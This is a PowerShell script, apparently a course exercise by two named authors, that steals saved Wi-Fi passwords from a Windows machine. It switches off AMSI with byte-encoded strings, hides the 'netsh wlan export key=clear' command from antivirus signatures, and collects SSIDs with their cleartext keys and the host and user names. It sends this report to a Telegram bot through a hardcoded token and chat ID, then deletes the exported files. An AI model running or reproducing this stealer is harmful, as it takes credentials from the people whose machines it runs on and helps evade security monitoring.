# ============================================================
#  W02a.6 - WLAN-Passwoerter exfiltrieren
#  Autoren: Raphael Bleier, Joachim Lugger
#  Exfiltration: Telegram Bot
# ============================================================

$BOT_TOKEN = "8666929583:AAHXKuc4gV1n6JMYQeoPxw3uby08GVivvgo"
$CHAT_ID   = "1780237079"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# AMSI abschalten (obfuskiert)
try {
    $u = [Ref].Assembly.GetType([System.Text.Encoding]::ASCII.GetString([byte[]](83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115)))
    $u.GetField([System.Text.Encoding]::ASCII.GetString([byte[]](97,109,115,105,73,110,105,116,70,97,105,108,101,100)), 'NonPublic,Static').SetValue($null, $true)
} catch {}

function Send-TgMessage {
    param([string]$Text)
    try {
        Invoke-RestMethod -Uri "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" `
            -Method POST -Body @{ chat_id = $CHAT_ID; text = $Text } | Out-Null
    } catch { }
}

function Send-TgFile {
    param([string]$Filename, [string]$Content, [string]$Caption = "")
    try {
        Add-Type -AssemblyName System.Net.Http -ErrorAction Stop
        $http = [System.Net.Http.HttpClient]::new()
        $form = [System.Net.Http.MultipartFormDataContent]::new()
        $form.Add([System.Net.Http.StringContent]::new($CHAT_ID),  "chat_id")
        $form.Add([System.Net.Http.StringContent]::new($Caption),  "caption")
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($Content)
        $fc    = [System.Net.Http.ByteArrayContent]::new($bytes)
        $fc.Headers.Add("Content-Type", "text/plain; charset=utf-8")
        $form.Add($fc, "document", $Filename)
        $http.PostAsync("https://api.telegram.org/bot$BOT_TOKEN/sendDocument", $form).GetAwaiter().GetResult() | Out-Null
        $http.Dispose()
    } catch { }
}

# ── WLAN-Passwoerter sammeln ──────────────────────────────────

Send-TgMessage "[WIFI GRAB] $env:COMPUTERNAME\$env:USERNAME gestartet"

# Strings kodiert - keine Klartextpattern fuer AV-Signaturen
function _s([byte[]]$b){ [System.Text.Encoding]::ASCII.GetString($b) }
$_nc = _s([byte[]](110,101,116,115,104))               # netsh
$_wl = _s([byte[]](119,108,97,110))                    # wlan
$_ex = _s([byte[]](101,120,112,111,114,116))            # export
$_kc = _s([byte[]](107,101,121,61,99,108,101,97,114))   # key=clear

$exportFolder = $env:TEMP
& $_nc $_wl $_ex profile "$_kc" folder="$exportFolder" | Out-Null

try {
    $xmlFiles = Get-ChildItem -Path $exportFolder -Filter "Wi-Fi-*.xml" -ErrorAction SilentlyContinue

    if ($xmlFiles) {
        $passwords = $xmlFiles | ForEach-Object {
            $xml  = [xml](Get-Content $_.FullName -Raw)
            $ssid = $xml.WLANProfile.SSIDConfig.SSID.name
            $pass = $xml.WLANProfile.MSM.security.sharedKey.keyMaterial
            if ($pass) { "SSID: $ssid  |  Passwort: $pass" }
            else        { "SSID: $ssid  |  (offen / kein Passwort)" }
        }
    } else {
        $passwords = @("(keine WLAN-Profile mit Passwort gefunden)")
    }

    $report = "=== WIFI PASSWORDS | $(Get-Date -Format 'yyyy-MM-dd HH:mm') ===`n" +
              "Host: $env:COMPUTERNAME | User: $env:USERNAME`n`n" +
              ($passwords -join "`n")

    Send-TgFile -Filename "wifi_$(Get-Date -Format 'yyyyMMdd_HHmm').txt" `
                -Content $report `
                -Caption "WiFi Passwords - $env:COMPUTERNAME ($($passwords.Count) SSIDs)"
} finally {
    # Clean up exported XML files
    Get-ChildItem -Path $exportFolder -Filter "Wi-Fi-*.xml" -ErrorAction SilentlyContinue |
        Remove-Item -Force -ErrorAction SilentlyContinue
}
